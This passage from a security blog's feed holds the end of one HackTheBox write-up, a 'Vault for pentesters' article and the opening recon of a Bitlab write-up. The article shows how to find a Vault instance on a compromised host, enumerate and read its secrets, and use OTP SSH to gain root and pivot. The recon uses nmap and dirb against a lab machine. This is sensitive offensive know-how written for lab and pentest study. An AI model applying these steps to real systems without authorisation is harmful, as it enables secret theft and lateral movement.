&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;a2577&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was not the most interesting one as everything is pretty straight
forward. Moreover the name
suggested me that there will be some SMTP (or IMAP) involved. I am a bit
disappointed.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="redis"></category><category term="webmin"></category><category term="linux"></category></entry><entry><title>Vault</title><link href="https://maggick.fr/2020/02/vault.html" rel="alternate"></link><published>2020-02-08T10:35:00+01:00</published><updated>2020-02-08T10:35:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-02-08:/2020/02/vault.html</id><summary type="html">&lt;blockquote&gt;
&lt;p&gt;"Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API."&lt;/p&gt;
&lt;/blockquote&gt;
</summary><content type="html">&lt;blockquote&gt;
&lt;p&gt;"Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API."&lt;/p&gt;
&lt;/blockquote&gt;


&lt;h1 id="presentation"&gt;Presentation&lt;/h1&gt;
&lt;h2 id="install"&gt;Install&lt;/h2&gt;
&lt;p&gt;Just go on the &lt;a href="https://www.vaultproject.io/downloads.html"&gt;download page&lt;/a&gt; and
get the package adapted to your system. Once you extract the downloaded zip, you
will get a binary. Execute it without any option to get the help menu.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ./vault&lt;/span&gt;
&lt;span class="code-line"&gt;Usage: vault &amp;lt;command&amp;gt; [args]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Common commands:&lt;/span&gt;
&lt;span class="code-line"&gt;    read        Read data and retrieves secrets&lt;/span&gt;
&lt;span class="code-line"&gt;    write       Write data, configuration, and secrets&lt;/span&gt;
&lt;span class="code-line"&gt;    delete      Delete secrets and configuration&lt;/span&gt;
&lt;span class="code-line"&gt;    list        List data or secrets&lt;/span&gt;
&lt;span class="code-line"&gt;    login       Authenticate locally&lt;/span&gt;
&lt;span class="code-line"&gt;    agent       Start a Vault agent&lt;/span&gt;
&lt;span class="code-line"&gt;    server      Start a Vault server&lt;/span&gt;
&lt;span class="code-line"&gt;    status      Print seal and HA status&lt;/span&gt;
&lt;span class="code-line"&gt;    unwrap      Unwrap a wrapped secret&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Other commands:&lt;/span&gt;
&lt;span class="code-line"&gt;    audit          Interact with audit devices&lt;/span&gt;
&lt;span class="code-line"&gt;    auth           Interact with auth methods&lt;/span&gt;
&lt;span class="code-line"&gt;    debug          Runs the debug command&lt;/span&gt;
&lt;span class="code-line"&gt;    kv             Interact with Vault&amp;#39;s Key-Value storage&lt;/span&gt;
&lt;span class="code-line"&gt;    lease          Interact with leases&lt;/span&gt;
&lt;span class="code-line"&gt;    namespace      Interact with namespaces&lt;/span&gt;
&lt;span class="code-line"&gt;    operator       Perform operator-specific tasks&lt;/span&gt;
&lt;span class="code-line"&gt;    path-help      Retrieve API help for paths&lt;/span&gt;
&lt;span class="code-line"&gt;    plugin         Interact with Vault plugins and catalog&lt;/span&gt;
&lt;span class="code-line"&gt;    policy         Interact with policies&lt;/span&gt;
&lt;span class="code-line"&gt;    print          Prints runtime configurations&lt;/span&gt;
&lt;span class="code-line"&gt;    secrets        Interact with secrets engines&lt;/span&gt;
&lt;span class="code-line"&gt;    ssh            Initiate an SSH session&lt;/span&gt;
&lt;span class="code-line"&gt;    token          Interact with tokens&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="getting-started"&gt;Getting started&lt;/h2&gt;
&lt;p&gt;Running dev server and exporting the &lt;code&gt;vault&lt;/code&gt; address&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The dev server is a built-in, pre-configured server that is not very secure but useful for playing with Vault locally.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ./vault server -dev&lt;/span&gt;
&lt;span class="code-line"&gt;$ export VAULT_ADDR=&amp;#39;http://127.0.0.1:8200&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can get the server status with the &lt;code&gt;status&lt;/code&gt; command. The server is
initialized and unsealed.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ./vault status&lt;/span&gt;
&lt;span class="code-line"&gt;Key             Value&lt;/span&gt;
&lt;span class="code-line"&gt;---             -----&lt;/span&gt;
&lt;span class="code-line"&gt;Seal Type       shamir&lt;/span&gt;
&lt;span class="code-line"&gt;Initialized     true&lt;/span&gt;
&lt;span class="code-line"&gt;Sealed          false&lt;/span&gt;
&lt;span class="code-line"&gt;Total Shares    1&lt;/span&gt;
&lt;span class="code-line"&gt;Threshold       1&lt;/span&gt;
&lt;span class="code-line"&gt;Version         1.3.0&lt;/span&gt;
&lt;span class="code-line"&gt;Cluster Name    vault-cluster-f6bdd069&lt;/span&gt;
&lt;span class="code-line"&gt;Cluster ID      14ded467-9ad3-3fc4-4403-bea46156b766&lt;/span&gt;
&lt;span class="code-line"&gt;HA Enabled      false&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This article will not describe the vault's tutorial. If you want to
manipulate vault:
&lt;a href="https://www.vaultproject.io/intro/getting-started/index.html"&gt;vault's getting started&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id="vault-for-pentesters"&gt;Vault for pentesters&lt;/h1&gt;
&lt;p&gt;What is really interesting is how to steal vault's secrets and maybe escalate
your privileges.
For the following we simulate a situation where we compromised a GNU/Linux
box and get a user shell.&lt;/p&gt;
&lt;h2 id="detecting-the-vault"&gt;Detecting the vault&lt;/h2&gt;
&lt;p&gt;First of all we need to know of vault is running on the machine. For that we can
run a simple &lt;code&gt;ps&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ps aux | grep vault&lt;/span&gt;
&lt;span class="code-line"&gt;root      2442  0.0  3.3  69564 68136 ?        SLsl 06:56   0:01 vault server -config /vault/config/config.hcl&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="login"&gt;Login&lt;/h2&gt;
&lt;p&gt;Then we need to login on the vault in order to get some information. Vault allow
sixteen login methods. Here we will present only two of them:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;token: the default method, a token is use to identify the user.&lt;/li&gt;
&lt;li&gt;username: "classical" username/password authentication method&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In order to use a non default method you need to use the &lt;code&gt;--method&lt;/code&gt; option for
instance:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ vault login -method=userpass username=my-username&lt;/span&gt;
&lt;span class="code-line"&gt;Password (will be hidden):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;For more information about
&lt;a href="https://www.vaultproject.io/docs/auth/index.html"&gt;vault's authentication methods&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In order to get a foothold on the vault instance we will need some
credentials: enumerate!&lt;/p&gt;
&lt;h3 id="root-policy"&gt;Root policy&lt;/h3&gt;
&lt;p&gt;Once login on the vault we can list our permission if we are in the "root"
policy we get a root access to the vault and can access every secret.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ vault login&lt;/span&gt;
&lt;span class="code-line"&gt;Token (will be hidden):&lt;/span&gt;
&lt;span class="code-line"&gt;Success! You are now authenticated. The token information displayed below&lt;/span&gt;
&lt;span class="code-line"&gt;is already stored in the token helper. You do NOT need to run &amp;quot;vault login&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;again. Future Vault requests will automatically use this token.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Key                  Value&lt;/span&gt;
&lt;span class="code-line"&gt;---                  -----&lt;/span&gt;
&lt;span class="code-line"&gt;token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9&lt;/span&gt;
&lt;span class="code-line"&gt;token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103&lt;/span&gt;
&lt;span class="code-line"&gt;token_duration       ∞&lt;/span&gt;
&lt;span class="code-line"&gt;token_renewable      false&lt;/span&gt;
&lt;span class="code-line"&gt;token_policies       [&amp;quot;root&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;identity_policies    []&lt;/span&gt;
&lt;span class="code-line"&gt;policies             [&amp;quot;root&amp;quot;]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If you do not have access to the "root" policy, you will still have access to
some secrets, maybe only with the right permissions.&lt;/p&gt;
&lt;p&gt;Either ways, you should enumerate and see what you can do from there.&lt;/p&gt;
&lt;h2 id="enumerating-the-secrets-engines"&gt;Enumerating the secrets engines&lt;/h2&gt;
&lt;p&gt;It is quit simple to list the available secrets engine (for a more detailed
output you can add the &lt;code&gt;-detailed&lt;/code&gt; parameter):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ vault secrets list&lt;/span&gt;
&lt;span class="code-line"&gt;Path          Type         Description&lt;/span&gt;
&lt;span class="code-line"&gt;----          ----         -----------&lt;/span&gt;
&lt;span class="code-line"&gt;cubbyhole/    cubbyhole    per-token private secret storage&lt;/span&gt;
&lt;span class="code-line"&gt;secret/       kv           key/value secret storage&lt;/span&gt;
&lt;span class="code-line"&gt;sys/          system       system endpoints used for control, policy and debugging&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="enumerating-the-secrets-for-an-engine"&gt;Enumerating the secrets for an engine&lt;/h2&gt;
&lt;p&gt;Once you know which secrets engines are running you will be able to list the
secrets from them.&lt;/p&gt;
&lt;p&gt;Here we will list the secret from the basic kv (key-value) secrets engine.&lt;/p&gt;
&lt;p&gt;If the vault is accessible with HTTP, open your browser and login to list
graphically the available information.&lt;/p&gt;
&lt;p&gt;&lt;img alt="listing the secret engines" src="/media/2020.02/vault_1.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Exploring the secrets' secrets" src="/media/2020.02/vault_2.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Displaying the value associated to the &amp;quot;foo&amp;quot; key" src="/media/2020.02/vault_3.png"&gt;&lt;/p&gt;
&lt;p&gt;If you do not have access to a web interface, you can list the secret using the
CLI.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ./vault kv list secret/&lt;/span&gt;
&lt;span class="code-line"&gt;Keys&lt;/span&gt;
&lt;span class="code-line"&gt;----&lt;/span&gt;
&lt;span class="code-line"&gt;adsfdasfdas&lt;/span&gt;
&lt;span class="code-line"&gt;hello&lt;/span&gt;
&lt;span class="code-line"&gt;$ ./vault kv list secret/&lt;/span&gt;
&lt;span class="code-line"&gt;Keys&lt;/span&gt;
&lt;span class="code-line"&gt;----&lt;/span&gt;
&lt;span class="code-line"&gt;adsfdasfdas&lt;/span&gt;
&lt;span class="code-line"&gt;hello&lt;/span&gt;
&lt;span class="code-line"&gt;$ ./vault kv get secret/hello&lt;/span&gt;
&lt;span class="code-line"&gt;====== Metadata ======&lt;/span&gt;
&lt;span class="code-line"&gt;Key              Value&lt;/span&gt;
&lt;span class="code-line"&gt;---              -----&lt;/span&gt;
&lt;span class="code-line"&gt;created_time     2019-11-15T14:10:00.428186002Z&lt;/span&gt;
&lt;span class="code-line"&gt;deletion_time    n/a&lt;/span&gt;
&lt;span class="code-line"&gt;destroyed        false&lt;/span&gt;
&lt;span class="code-line"&gt;version          2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;=== Data ===&lt;/span&gt;
&lt;span class="code-line"&gt;Key    Value&lt;/span&gt;
&lt;span class="code-line"&gt;---    -----&lt;/span&gt;
&lt;span class="code-line"&gt;foo    world&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="ssh"&gt;SSH&lt;/h2&gt;
&lt;p&gt;Vault allow to store other object than key:value couples. For instance it is
possible to configure Vault to provide a one time password to connect with ssh
to a remote server (with the contribution of an ssh-helper client side. More
information on how to install this:
&lt;a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html"&gt;documentation OTP SSH&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;Once installed and configured it allow to connect to "remote" host:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;:~&lt;/span&gt;&lt;span class="n"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;vault&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;otp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;role&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;root_otp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="mf"&gt;@127.0.0.1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Vault&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;could&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;locate&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;sshpass&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;OTP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;displayed&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;below&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Enter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SSH&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;If&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;install&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sshpass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Vault&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;can&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;automatically&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;perform&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;step&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;OTP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;is&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;ee17d0c&lt;/span&gt;&lt;span class="mi"&gt;-1&lt;/span&gt;&lt;span class="n"&gt;eef&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;a286&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;fd6d&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e50702c38c00&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;:::&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;Password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;:~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This might allow you to pivot from the compromised host to another.&lt;/p&gt;
&lt;h1 id="short-conclusion"&gt;Short conclusion&lt;/h1&gt;
&lt;p&gt;This article just scratch the vault surface as there is &lt;a href="https://www.vaultproject.io/docs/secrets/index.html"&gt;eighteen secrets
engine&lt;/a&gt; at the moment and I
have not speak about sealing and unsealing the vault.
This solution can resolve some authentication and secret sharing issues but
it is crucial that the vault's authentication secrets are well keep.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="devops"></category><category term="vault"></category></entry><entry><title>HTB: Bitlab</title><link href="https://maggick.fr/2020/01/htb-bitlab.html" rel="alternate"></link><published>2020-01-11T20:40:00+01:00</published><updated>2020-01-11T20:40:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-01-11:/2020/01/htb-bitlab.html</id><summary type="html">&lt;p&gt;&lt;img alt="Bitlab Card" class="align-left" src="/media/2020.01/bitlab_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/207"&gt;Bitlab&lt;/a&gt;.
This box is rated as a medium box. It implies a gitlab, a user, some
enumeration, a PostgreSQL database, some pain with a b64 password and some basic
reverse engineering on a Windows binary.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;If you just want to play with the binary: it is available in the
"RemoteConnection.exe" part.&lt;/em&gt;&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.01/bitlab_card.png" alt="Bitlab Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/207"&gt;Bitlab&lt;/a&gt;.
This box is rated as a medium box. It implies a gitlab, a user, some
enumeration, a PostgreSQL database, some pain with a b64 password and some basic
reverse engineering on a Windows binary.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;If you just want to play with the binary: it is available in the
"RemoteConnection.exe" part.&lt;/em&gt;&lt;/p&gt;


&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only the ports 22 (SSH) and 80 (HTTP)
are open:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Nov 25 13:23:49 2019 as: nmap -p- -oA nmap 10.10.10.114&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.114&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.099s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Mon Nov 25 13:26:14 2019 -- 1 IP address (1 host up) scanned in 145.18 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The home page is a &lt;a href="https://about.gitlab.com/"&gt;gitlab&lt;/a&gt; home page.&lt;/p&gt;
&lt;p&gt;We run a &lt;a href="https://tools.kali.org/web-applications/dirb"&gt;dirb&lt;/a&gt; against the home
page and discover a few pages and directory.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;OUTPUT_FILE: dirb&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Mon Nov 25 13:28:27 2019&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.114/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.114/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/explore (CODE:200|SIZE:13675)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/favicon.ico (CODE:301|SIZE:169)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/groups (CODE:302|SIZE:100)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.114/help/&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.114/profile/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/projects (CODE:302|SIZE:93)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/public (CODE:200|SIZE:13755)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/robots.txt (CODE:200|SIZE:2153)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/root (CODE:200|SIZE:16026)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/Root (CODE:302|SIZE:90)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/search (CODE:200|SIZE:13366)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/snippets (CODE:302|SIZE:102)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/test (CODE:302|SIZE:91)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.114/help/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;(!) WARNING: Directory IS LISTABLE. No need to scan it.&lt;/span&gt;
&lt;span class="code-line"&gt;    (Use mode &amp;#39;-w&amp;#39; if you want to scan it anyway)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Entering directory: http://10.10.10.114/profile/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.114/profile/index.php (CODE:200|SIZE:4184)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;END_TIME: Mon Nov 25 13:44:24 2019&lt;/span&gt;
&lt;span class="code-line"&gt;DOWNLOADED: 9224 - FOUND: 12&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="gitlab-unauthenticated"&gt;Gitlab unauthenticated&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;profile&lt;/code&gt; URL give us access to some developer ugly profile:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Clave profile" src="/media/2020.01/bitlab_5.png"&gt;&lt;/p&gt;
